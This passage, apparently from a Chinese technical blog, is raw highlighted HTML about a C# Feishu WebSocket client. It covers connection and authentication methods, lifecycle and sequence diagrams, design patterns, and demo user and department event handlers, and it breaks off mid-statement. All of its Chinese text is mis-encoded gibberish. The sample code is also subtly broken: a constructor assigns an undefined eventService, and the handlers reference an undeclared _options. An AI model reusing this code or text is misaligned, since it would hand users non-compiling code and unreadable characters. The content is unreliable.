    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">SubscribeToComponentEvents</span>()</span>
    {
        <span class="hljs-comment">// è¿æ¥ç®¡ç†å™¨äº‹ä»¶</span>
        _connectionManager.Connected += (s, e) =&gt; Connected?.Invoke(<span class="hljs-keyword">this</span>, e);
        _connectionManager.Disconnected += (s, e) =&gt; Disconnected?.Invoke(<span class="hljs-keyword">this</span>, e);
        _connectionManager.Error += (s, e) =&gt; Error?.Invoke(<span class="hljs-keyword">this</span>, e);

        <span class="hljs-comment">// è®¤è¯ç®¡ç†å™¨äº‹ä»¶</span>
        _authManager.Authenticated += (s, e) =&gt; Authenticated?.Invoke(<span class="hljs-keyword">this</span>, e);
        _authManager.AuthenticationFailed += (s, e) =&gt; Error?.Invoke(<span class="hljs-keyword">this</span>, e);

        <span class="hljs-comment">// äºŒè¿›åˆ¶å¤„ç†å™¨äº‹ä»¶</span>
        _binaryProcessor.BinaryMessageReceived += (s, e) =&gt; BinaryMessageReceived?.Invoke(<span class="hljs-keyword">this</span>, e);
        _binaryProcessor.Error += (s, e) =&gt; Error?.Invoke(<span class="hljs-keyword">this</span>, e);
    }

    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> æ³¨å†Œæ¶ˆæ¯å¤„ç†å™¨</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">RegisterMessageHandlers</span>()</span>
    {
        <span class="hljs-keyword">var</span> pingPongHandler = <span class="hljs-keyword">new</span> PingPongMessageHandler(
            _loggerFactory.CreateLogger&lt;PingPongMessageHandler&gt;(),
            _options,
            (message) =&gt; SendMessageAsync(message));

        <span class="hljs-keyword">var</span> authHandler = <span class="hljs-keyword">new</span> AuthMessageHandler(
            _loggerFactory.CreateLogger&lt;AuthMessageHandler&gt;(),
            (success) =&gt;
            {
                <span class="hljs-keyword">if</span> (success)
                {
                    _authManager.HandleAuthResponse(<span class="hljs-string">"{\"code\":0,\"msg\":\"Authentication successful\"}"</span>);
                }
                <span class="hljs-keyword">else</span>
                {
                    _authManager.HandleAuthResponse(<span class="hljs-string">"{\"code\":-1,\"msg\":\"Authentication failed\"}"</span>);
                }
            });

        <span class="hljs-keyword">var</span> heartbeatHandler = <span class="hljs-keyword">new</span> HeartbeatMessageHandler(_loggerFactory.CreateLogger&lt;HeartbeatMessageHandler&gt;(), _options);

        _messageRouter.RegisterHandler(pingPongHandler);
        _messageRouter.RegisterHandler(authHandler);
        _messageRouter.RegisterHandler(heartbeatHandler);
    }

    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> å»ºç«‹WebSocketè¿æ¥</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">async</span> Task <span class="hljs-title">ConnectAsync</span>(<span class="hljs-params">WsEndpointResult endpoint, CancellationToken cancellationToken = <span class="hljs-literal">default</span></span>)</span>
    {
        <span class="hljs-keyword">if</span> (endpoint == <span class="hljs-literal">null</span>)
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ArgumentNullException(<span class="hljs-keyword">nameof</span>(endpoint));

        <span class="hljs-keyword">await</span> _connectionManager.ConnectAsync(endpoint.Url, cancellationToken);

        <span class="hljs-comment">// å¯åŠ¨æ¶ˆæ¯æ¥æ”¶</span>
        _cancellationTokenSource = <span class="hljs-keyword">new</span> CancellationTokenSource();
        _ = Task.Run(() =&gt; StartReceivingAsyncInternal(_cancellationTokenSource.Token), _cancellationTokenSource.Token);

        <span class="hljs-comment">// å¯åŠ¨å¿ƒè·³</span>
        _ = Task.Run(() =&gt; StartHeartbeatAsync(_cancellationTokenSource.Token), _cancellationTokenSource.Token);

        <span class="hljs-comment">// å¯åŠ¨æ¶ˆæ¯é˜Ÿåˆ—å¤„ç†</span>
        <span class="hljs-keyword">if</span> (_options.EnableMessageQueue)
        {
            _messageProcessingTask = ProcessMessageQueueAsync(_cancellationTokenSource.Token);
        }
    }

    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> å»ºç«‹WebSocketè¿æ¥å¹¶è¿›è¡Œè®¤è¯</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">async</span> Task <span class="hljs-title">ConnectAsync</span>(<span class="hljs-params">WsEndpointResult endpoint, <span class="hljs-built_in">string</span> appAccessToken, CancellationToken cancellationToken = <span class="hljs-literal">default</span></span>)</span>
    {
        <span class="hljs-keyword">await</span> ConnectAsync(endpoint, cancellationToken);
        <span class="hljs-keyword">await</span> _authManager.AuthenticateAsync(appAccessToken, cancellationToken);
    }

    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> æ–­å¼€WebSocketè¿æ¥</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">async</span> Task <span class="hljs-title">DisconnectAsync</span>(<span class="hljs-params">CancellationToken cancellationToken = <span class="hljs-literal">default</span></span>)</span>
    {
        _cancellationTokenSource?.Cancel();
        <span class="hljs-keyword">await</span> _connectionManager.DisconnectAsync(cancellationToken);
    }

    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> å‘é€æ¶ˆæ¯</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">async</span> Task <span class="hljs-title">SendMessageAsync</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> message, CancellationToken cancellationToken = <span class="hljs-literal">default</span></span>)</span>
    {
        <span class="hljs-keyword">await</span> _connectionManager.SendMessageAsync(message, cancellationToken);
    }

    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> æ³¨å†Œæ¶ˆæ¯å¤„ç†å™¨</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">RegisterMessageProcessor</span>(<span class="hljs-params">Func&lt;<span class="hljs-built_in">string</span>, Task&gt; processor</span>)</span>
    {
        <span class="hljs-keyword">if</span> (processor == <span class="hljs-literal">null</span>)
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ArgumentNullException(<span class="hljs-keyword">nameof</span>(processor));

        _messageProcessors.Add(processor);
    }
}
</code></pre>
<p><strong>å®¢æˆ·ç«¯ç”Ÿå‘½å‘¨æœŸç®¡ç†</strong></p>
<pre><code class="hljs language-mermaid" lang="mermaid">stateDiagram-v2
    [*] --&gt; Disconnected: åˆå§‹åŒ–
    Disconnected --&gt; Connecting: ConnectAsync
    Connecting --&gt; Connected: è¿æ¥æˆåŠŸ
    Connecting --&gt; AuthenticationFailed: è¿æ¥å¤±è´¥
    Connected --&gt; Authenticating: è®¤è¯æµç¨‹
    Authenticating --&gt; Authenticated: è®¤è¯æˆåŠŸ
    Authenticating --&gt; AuthenticationFailed: è®¤è¯å¤±è´¥
    Authenticated --&gt; Active: å¯åŠ¨åå°ä»»åŠ¡
    Active --&gt; Disconnecting: DisconnectAsync
    AuthenticationFailed --&gt; Disconnecting: æ¸…ç†èµ„æº
    Disconnecting --&gt; Disconnected: æ–­å¼€å®Œæˆ
    Active --&gt; Reconnecting: è¿æ¥å¼‚å¸¸
    Reconnecting --&gt; Connecting: é‡è¿å°è¯•
    
    note right of Connecting
        å»ºç«‹WebSocketè¿æ¥
        åˆå§‹åŒ–ç»„ä»¶çŠ¶æ€
        å¯åŠ¨äº‹ä»¶è®¢é˜…
    end note
    
    note right of Authenticating
        å‘é€è®¤è¯æ¶ˆæ¯
        ç­‰å¾…è®¤è¯å“åº”
        æ›´æ–°è®¤è¯çŠ¶æ€
    end note
    
    note right of Active
        æ¶ˆæ¯æ¥æ”¶å¤„ç†
        å¿ƒè·³ç›‘æ§
        æ¶ˆæ¯é˜Ÿåˆ—å¤„ç†
    end note
</code></pre>
<p><strong>ç»„ä»¶åä½œæ—¶åºå›¾</strong></p>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant Client as FeishuWebSocketClient
    participant ConnManager as ConnectionManager
    participant AuthManager as AuthenticationManager
    participant MsgRouter as MessageRouter
    participant BinProcessor as BinaryProcessor
    participant App as åº”ç”¨ç¨‹åº
    
    App-&gt;&gt;Client: ConnectAsync(endpoint, token)
    Client-&gt;&gt;ConnManager: ConnectAsync(url)
    ConnManager--&gt;&gt;Client: è¿æ¥æˆåŠŸäº‹ä»¶
    
    Client-&gt;&gt;Client: å¯åŠ¨æ¶ˆæ¯æ¥æ”¶
    Client-&gt;&gt;Client: å¯åŠ¨å¿ƒè·³
    Client-&gt;&gt;Client: å¯åŠ¨æ¶ˆæ¯é˜Ÿåˆ—
    
    Client-&gt;&gt;AuthManager: AuthenticateAsync(token)
    AuthManager-&gt;&gt;ConnManager: SendMessageAsync(authæ¶ˆæ¯)
    AuthManager--&gt;&gt;Client: è®¤è¯æˆåŠŸäº‹ä»¶
    
    Note over Client: æ¶ˆæ¯æ¥æ”¶å¤„ç†å¾ªç¯
    loop æ¶ˆæ¯æ¥æ”¶
        ConnManager-&gt;&gt;Client: æ¥æ”¶WebSocketæ¶ˆæ¯
        
        alt æ–‡æœ¬æ¶ˆæ¯
            Client-&gt;&gt;MsgRouter: RouteMessageAsync(message)
            MsgRouter-&gt;&gt;MsgRouter: æŸ¥æ‰¾å¤„ç†å™¨
            MsgRouter-&gt;&gt;MsgRouter: å¤„ç†æ¶ˆæ¯
            MsgRouter--&gt;&gt;Client: å¤„ç†å®Œæˆ
        else äºŒè¿›åˆ¶æ¶ˆæ¯
            Client-&gt;&gt;BinProcessor: ProcessBinaryDataAsync(data)
            BinProcessor-&gt;&gt;BinProcessor: è§£æProtoBuf
            BinProcessor-&gt;&gt;MsgRouter: RouteBinaryMessageAsync(json)
            BinProcessor--&gt;&gt;Client: BinaryMessageReceivedäº‹ä»¶
        end
        
        Client-&gt;&gt;App: è§¦å‘ç›¸åº”äº‹ä»¶
    end
    
    App-&gt;&gt;Client: DisconnectAsync()
    Client-&gt;&gt;ConnManager: DisconnectAsync()
    Client-&gt;&gt;Client: å–æ¶ˆåå°ä»»åŠ¡
    Client--&gt;&gt;App: æ–­å¼€å®Œæˆ
</code></pre>
<p><strong>æ ¸å¿ƒè®¾è®¡æ¨¡å¼</strong></p>
<ol>
<li>
<p><strong>é—¨é¢æ¨¡å¼ï¼ˆFacade Patternï¼‰</strong>ï¼š</p>
<ul>
<li>FeishuWebSocketClientä½œä¸ºç»Ÿä¸€å…¥å£</li>
<li>éšè—å†…éƒ¨ç»„ä»¶å¤æ‚æ€§</li>
<li>æä¾›ç®€æ´çš„APIæ¥å£</li>
</ul>
</li>
<li>
<p><strong>è§‚å¯Ÿè€…æ¨¡å¼ï¼ˆObserver Patternï¼‰</strong>ï¼š</p>
<ul>
<li>äº‹ä»¶é©±åŠ¨çš„ç»„ä»¶é€šä¿¡</li>
<li>æ¾è€¦åˆçš„ç»„ä»¶åä½œ</li>
<li>æ”¯æŒå¤šè®¢é˜…è€…ç›‘å¬</li>
</ul>
</li>
<li>
<p><strong>ç­–ç•¥æ¨¡å¼ï¼ˆStrategy Patternï¼‰</strong>ï¼š</p>
<ul>
<li>å¯æ’æ‹”çš„æ¶ˆæ¯å¤„ç†å™¨</li>
<li>çµæ´»çš„è·¯ç”±ç­–ç•¥</li>
<li>åŠ¨æ€å¤„ç†å™¨æ³¨å†Œ</li>
</ul>
</li>
<li>
<p><strong>å·¥å‚æ¨¡å¼ï¼ˆFactory Patternï¼‰</strong>ï¼š</p>
<ul>
<li>EventHandlerFactoryåˆ›å»ºå¤„ç†å™¨</li>
<li>ç»Ÿä¸€çš„ç»„ä»¶åˆå§‹åŒ–</li>
<li>ä¾èµ–æ³¨å…¥æ”¯æŒ</li>
</ul>
</li>
</ol>
<h2 data-id="heading-13">å››ã€åº”ç”¨ç¤ºä¾‹</h2>
<h3 data-id="heading-14">4.1 äº‹ä»¶å¤„ç†å™¨å®ç°</h3>
<p><strong>ç”¨æˆ·åˆ›å»ºäº‹ä»¶å¤„ç†å™¨ç¤ºä¾‹</strong></p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> æ¼”ç¤ºç”¨æˆ·äº‹ä»¶å¤„ç†å™¨ - ç»§æ‰¿é¢„å®šä¹‰çš„ç”¨æˆ·åˆ›å»ºäº‹ä»¶å¤„ç†å™¨</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">DemoUserEventHandler</span> : <span class="hljs-title">DefaultFeishuEventHandler</span>&lt;<span class="hljs-title">UserCreatedResult</span>&gt;
{
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> DemoEventService _eventService;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> INotificationService _notificationService;
    
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">DemoUserEventHandler</span>(<span class="hljs-params">
        ILogger&lt;DemoUserEventHandler&gt; logger,
        INotificationService notificationService</span>) : <span class="hljs-title">base</span>(<span class="hljs-params">logger</span>)</span>
    {
        _eventService = eventService ?? <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ArgumentNullException(<span class="hljs-keyword">nameof</span>(eventService));
        _notificationService = notificationService ?? <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ArgumentNullException(<span class="hljs-keyword">nameof</span>(notificationService));
    }
    
    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">override</span> <span class="hljs-keyword">async</span> Task <span class="hljs-title">ProcessBusinessLogicAsync</span>(<span class="hljs-params">
        EventData eventData, 
        UserCreatedResult? userCreated, 
        CancellationToken cancellationToken = <span class="hljs-literal">default</span></span>)</span>
    {
        <span class="hljs-keyword">if</span> (eventData == <span class="hljs-literal">null</span>)
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ArgumentNullException(<span class="hljs-keyword">nameof</span>(eventData));

        _logger.LogInformation(<span class="hljs-string">"ğŸ‘¤ [ç”¨æˆ·äº‹ä»¶] å¼€å§‹å¤„ç†ç”¨æˆ·åˆ›å»ºäº‹ä»¶: {EventId}"</span>, eventData.EventId);

        <span class="hljs-keyword">try</span>
        {
            <span class="hljs-comment">// 1. æ•°æ®éªŒè¯å’Œè½¬æ¢</span>
            <span class="hljs-keyword">var</span> user = ValidateAndTransformUser(userCreated?.Object);
            
            <span class="hljs-comment">// 2. ä¿å­˜åˆ°æ•°æ®åº“</span>
            <span class="hljs-keyword">await</span> _eventService.RecordUserEventAsync(user, cancellationToken);
            
            <span class="hljs-comment">// 3. ä¸šåŠ¡é€»è¾‘å¤„ç†</span>
            <span class="hljs-keyword">await</span> ProcessUserEventAsync(user, cancellationToken);
            
            <span class="hljs-comment">// 4. æ›´æ–°ç»Ÿè®¡ä¿¡æ¯</span>
            _eventService.IncrementUserCount();

            _logger.LogInformation(<span class="hljs-string">"âœ… [ç”¨æˆ·äº‹ä»¶] ç”¨æˆ·åˆ›å»ºäº‹ä»¶å¤„ç†å®Œæˆ: ç”¨æˆ·ID {UserId}, ç”¨æˆ·å {UserName}"</span>,
                user.UserId, user.UserName);
        }
        <span class="hljs-keyword">catch</span> (Exception ex)
        {
            _logger.LogError(ex, <span class="hljs-string">"âŒ [ç”¨æˆ·äº‹ä»¶] å¤„ç†ç”¨æˆ·åˆ›å»ºäº‹ä»¶å¤±è´¥: {EventId}"</span>, eventData.EventId);
            <span class="hljs-keyword">throw</span>;
        }
    }
    
    <span class="hljs-function"><span class="hljs-keyword">private</span> UserData <span class="hljs-title">ValidateAndTransformUser</span>(<span class="hljs-params">UserCreatedResult? userCreated</span>)</span>
    {
        <span class="hljs-keyword">if</span> (userCreated == <span class="hljs-literal">null</span>)
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ArgumentException(<span class="hljs-string">"ç”¨æˆ·åˆ›å»ºæ•°æ®ä¸èƒ½ä¸ºç©º"</span>);
        
        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">string</span>.IsNullOrWhiteSpace(userCreated.UserId))
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ArgumentException(<span class="hljs-string">"ç”¨æˆ·IDä¸èƒ½ä¸ºç©º"</span>);
        
        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">string</span>.IsNullOrWhiteSpace(userCreated.Name))
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ArgumentException(<span class="hljs-string">"ç”¨æˆ·åä¸èƒ½ä¸ºç©º"</span>);
        
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> UserData
        {
            UserId = userCreated.UserId,
            UserName = userCreated.Name,
            Email = userCreated.Email ?? <span class="hljs-built_in">string</span>.Empty,
            Department = userCreated.Department ?? <span class="hljs-built_in">string</span>.Empty,
            EmployeeType = userCreated.EmployeeType ?? <span class="hljs-built_in">string</span>.Empty,
            CreatedAt = userCreated.CreatedAt
        };
    }
    
    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">async</span> Task <span class="hljs-title">ProcessUserEventAsync</span>(<span class="hljs-params">UserData user, CancellationToken cancellationToken</span>)</span>
    {
        <span class="hljs-comment">// æ¨¡æ‹Ÿå¼‚æ­¥ä¸šåŠ¡æ“ä½œ</span>
        <span class="hljs-keyword">await</span> Task.Delay(<span class="hljs-number">100</span>, cancellationToken);
        
        <span class="hljs-comment">// éªŒè¯å¿…è¦å­—æ®µ</span>
        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">string</span>.IsNullOrWhiteSpace(user.UserId))
        {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ArgumentException(<span class="hljs-string">"ç”¨æˆ·IDä¸èƒ½ä¸ºç©º"</span>);
        }
        
        <span class="hljs-comment">// æ¨¡æ‹Ÿå‘é€æ¬¢è¿é€šçŸ¥</span>
        <span class="hljs-keyword">if</span> (_options.EnableLogging)
            _logger.LogInformation(<span class="hljs-string">"ğŸ“§ [ç”¨æˆ·äº‹ä»¶] å‘é€æ¬¢è¿é€šçŸ¥ç»™ç”¨æˆ·: {UserName} ({Email})"</span>,
                user.UserName, user.Email);
        
        <span class="hljs-keyword">await</span> _notificationService.SendWelcomeEmailAsync(user, cancellationToken);
        
        <span class="hljs-comment">// æ¨¡æ‹Ÿç”¨æˆ·é…ç½®æ–‡ä»¶åˆ›å»º</span>
        <span class="hljs-keyword">if</span> (_options.EnableLogging)
            _logger.LogInformation(<span class="hljs-string">"âš™ï¸ [ç”¨æˆ·äº‹ä»¶] åˆ›å»ºç”¨æˆ·é…ç½®æ–‡ä»¶: {UserId}"</span>, user.UserId);
        
        <span class="hljs-keyword">await</span> _eventService.CreateUserProfileAsync(user, cancellationToken);
        
        <span class="hljs-comment">// æ¨¡æ‹Ÿæƒé™åˆå§‹åŒ–</span>
        <span class="hljs-keyword">if</span> (_options.EnableLogging)
            _logger.LogInformation(<span class="hljs-string">"ğŸ” [ç”¨æˆ·äº‹ä»¶] åˆå§‹åŒ–ç”¨æˆ·æƒé™: {UserId}"</span>, user.UserId);
        
        <span class="hljs-keyword">await</span> _eventService.InitializeUserPermissionsAsync(user, cancellationToken);
        
        <span class="hljs-keyword">await</span> Task.CompletedTask;
    }
}
</code></pre>
<h3 data-id="heading-15">4.2 ç»§æ‰¿é¢„å®šä¹‰äº‹ä»¶å¤„ç†å™¨</h3>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> æ¼”ç¤ºéƒ¨é—¨äº‹ä»¶å¤„ç†å™¨ - ç»§æ‰¿é¢„å®šä¹‰çš„éƒ¨é—¨åˆ›å»ºäº‹ä»¶å¤„ç†å™¨</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">DemoDepartmentEventHandler</span> : <span class="hljs-title">DepartmentCreatedEventHandler</span>
{
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> DemoEventService _eventService;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> INotificationService _notificationService;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> IPermissionService _permissionService;

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">DemoDepartmentEventHandler</span>(<span class="hljs-params">
        ILogger&lt;DemoDepartmentEventHandler&gt; logger, 
        DemoEventService eventService,
        INotificationService notificationService,
        IPermissionService permissionService</span>) : <span class="hljs-title">base</span>(<span class="hljs-params">logger</span>)</span>
    {
        _eventService = eventService ?? <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ArgumentNullException(<span class="hljs-keyword">nameof</span>(eventService));
        _notificationService = notificationService ?? <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ArgumentNullException(<span class="hljs-keyword">nameof</span>(notificationService));
        _permissionService = permissionService ?? <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ArgumentNullException(<span class="hljs-keyword">nameof</span>(permissionService));
    }

    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">override</span> <span class="hljs-keyword">async</span> Task <span class="hljs-title">ProcessBusinessLogicAsync</span>(<span class="hljs-params">
        EventData eventData, 
        ObjectEventResult&lt;DepartmentCreatedResult&gt;? departmentData, 
        CancellationToken cancellationToken = <span class="hljs-literal">default</span></span>)</span>
    {
        <span class="hljs-keyword">if</span> (eventData == <span class="hljs-literal">null</span>)
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ArgumentNullException(<span class="hljs-keyword">nameof</span>(eventData));

        _logger.LogInformation(<span class="hljs-string">"[éƒ¨é—¨äº‹ä»¶] å¼€å§‹å¤„ç†éƒ¨é—¨åˆ›å»ºäº‹ä»¶: {EventId}"</span>, eventData.EventId);

        <span class="hljs-keyword">try</span>
        {
            <span class="hljs-comment">// 1. éªŒè¯éƒ¨é—¨æ•°æ®</span>
            <span class="hljs-keyword">var</span> department = ValidateDepartmentData(departmentData?.Object);
            
            <span class="hljs-comment">// 2. è®°å½•äº‹ä»¶åˆ°æœåŠ¡</span>
            <span class="hljs-keyword">await</span> _eventService.RecordDepartmentEventAsync(department, cancellationToken);
            
            <span class="hljs-comment">// 3. å¤„ç†éƒ¨é—¨ä¸šåŠ¡é€»è¾‘</span>
            <span class="hljs-keyword">await</span> ProcessDepartmentEventAsync(department, cancellationToken);
            
            <span class="hljs-comment">// 4. åˆå§‹åŒ–éƒ¨é—¨æƒé™</span>
            <span class="hljs-keyword">await</span> InitializeDepartmentPermissionsAsync(department, cancellationToken);
            
            <span class="hljs-comment">// 5. æ›´æ–°ç»Ÿè®¡ä¿¡æ¯</span>
            _eventService.IncrementDepartmentCount();

            _logger.LogInformation(<span class="hljs-string">"[éƒ¨é—¨äº‹ä»¶] éƒ¨é—¨åˆ›å»ºäº‹ä»¶å¤„ç†å®Œæˆ: éƒ¨é—¨ID {DepartmentId}, éƒ¨é—¨å {DepartmentName}"</span>,
                department.DepartmentId, department.Name);
        }
        <span class="hljs-keyword">catch</span> (Exception ex)
        {
            _logger.LogError(ex, <span class="hljs-string">"[éƒ¨é—¨äº‹ä»¶] å¤„ç†éƒ¨é—¨åˆ›å»ºäº‹ä»¶å¤±è´¥: {EventId}"</span>, eventData.EventId);
            <span class="hljs-keyword">throw</span>;
        }
    }
    
    <span class="hljs-function"><span class="hljs-keyword">private</span> DepartmentData <span class="hljs-title">ValidateDepartmentData</span>(<span class="hljs-params">DepartmentCreatedResult? departmentResult</span>)</span>
    {
        <span class="hljs-keyword">if</span> (departmentResult == <span class="hljs-literal">null</span>)
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ArgumentException(<span class="hljs-string">"éƒ¨é—¨åˆ›å»ºæ•°æ®ä¸èƒ½ä¸ºç©º"</span>);
        
        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">string</span>.IsNullOrWhiteSpace(departmentResult.DepartmentId))
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ArgumentException(<span class="hljs-string">"éƒ¨é—¨IDä¸èƒ½ä¸ºç©º"</span>);
        
        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">string</span>.IsNullOrWhiteSpace(departmentResult.Name))
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ArgumentException(<span class="hljs-string">"éƒ¨é—¨åä¸èƒ½ä¸ºç©º"</span>);
        
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> DepartmentData
        {
            DepartmentId = departmentResult.DepartmentId,
            Name = departmentResult.Name,
            ParentDepartmentId = departmentResult.ParentDepartmentId,
            LeaderUserId = departmentResult.LeaderUserId,
            DepartmentLevel = departmentResult.DepartmentLevel,
            CreatedAt = DateTime.UtcNow
        };
    }
    
    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">async</span> Task <span class="hljs-title">ProcessDepartmentEventAsync</span>(<span class="hljs-params">DepartmentData department, CancellationToken cancellationToken</span>)</span>
    {
        <span class="hljs-comment">// æ¨¡æ‹Ÿå¼‚æ­¥ä¸šåŠ¡æ“ä½œ</span>
        <span class="hljs-keyword">await</span> Task.Delay(<span class="hljs-number">100</span>, cancellationToken);
        
        <span class="hljs-comment">// æ¨¡æ‹Ÿè®¾ç½®éƒ¨é—¨é…ç½®</span>
        <span class="hljs-keyword">if</span> (_options.EnableLogging)
            _logger.LogInformation(<span class="hljs-string">"[éƒ¨é—¨äº‹ä»¶] è®¾ç½®éƒ¨é—¨é…ç½®: {DepartmentName}"</span>, department.Name);
        
        <span class="hljs-keyword">await</span> _eventService.ConfigureDepartmentSettingsAsync(department, cancellationToken);
        
        <span class="hljs-comment">// é€šçŸ¥éƒ¨é—¨ä¸»ç®¡</span>
        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">string</span>.IsNullOrWhiteSpace(department.LeaderUserId))
        {
            <span class="hljs-keyword">if</span> (_options.EnableLogging)
                _logger.LogInformation(<span class="hljs-string">"[éƒ¨é—¨äº‹ä»¶] é€šçŸ¥éƒ¨é—¨ä¸»ç®¡: {LeaderUserId}"</span>, department.LeaderUserId);
            
            <span class="hljs-keyword">await</span> _notificationService.NotifyDepartmentLeaderAsync(department, cancellationToken);
        }
        
        <span class="hljs-comment">// å¤„ç†å±‚çº§å…³ç³»</span>
        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">string</span>.IsNullOrWhiteSpace(department.ParentDepartmentId))
        {
            <span class="hljs-keyword">if</span> (_options.EnableLogging)
                _logger.LogInformation(<span class="hljs-string">"[éƒ¨é—¨äº‹ä»¶] å»ºç«‹å±‚çº§å…³ç³»: {DepartmentId} -&gt; {ParentDepartmentId}"</span>,
                    department.DepartmentId, department.ParentDepartmentId);
            
            <span class="hljs-keyword">await</span> _eventService.UpdateDepartmentHierarchyAsync(department, cancellationToken);
        }
        
        <span class="hljs-keyword">await</span> Task.CompletedTask;
    }
    
    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">async</span> Task <span class="hljs-title">InitializeDepartmentPermissionsAsync</span>(<span class="hljs-params">DepartmentData department, CancellationToken cancellationToken</span>)</span>
    {
        <span class="hljs-keyword">if</span> (_options.EnableLogging)
            _logger.LogInformation(<span class="hljs-string">"[éƒ¨é—¨äº‹ä»¶] åˆå§‹åŒ–éƒ¨é—¨æƒé™: {DepartmentName}"</span>, department.Name);
        
        <span class="hljs-comment">// åˆ›å»ºéƒ¨é—¨é»˜è®¤æƒé™</span>
        <span class="hljs-keyword">var</span> defaultPermissions = <span class="hljs-keyword">new</span>[]
        {
            <span class="hljs-string">"department.view"</span>,
            <span class="hljs-string">"department.edit"</span>,
            <span class="hljs-string">"department.member.manage"</span>
        };
        
        <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">var</span> permission <span class="hljs-keyword">in</span> defaultPermissions)
        {
            <span class="hljs-keyword">await</span> _permissionService.GrantPermissionAsync(
